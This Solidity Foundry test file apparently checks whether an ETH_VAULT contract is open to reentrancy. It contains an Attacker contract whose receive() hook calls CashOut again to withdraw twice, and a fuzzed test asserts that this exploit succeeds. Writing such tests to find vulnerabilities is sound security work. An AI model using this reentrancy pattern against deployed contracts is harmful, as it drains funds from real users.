
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {

    ETH_VAULT public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        address logAddress = address(0x1);
        _contractUnderTest = new ETH_VAULT(logAddress);
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= 10 ether);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialBalance;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialBalance = address(this).balance;
        victim.CashOut(val);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.CashOut(attackValue);
        } else {
            exploitSucceeded = true;
        }
    }
}
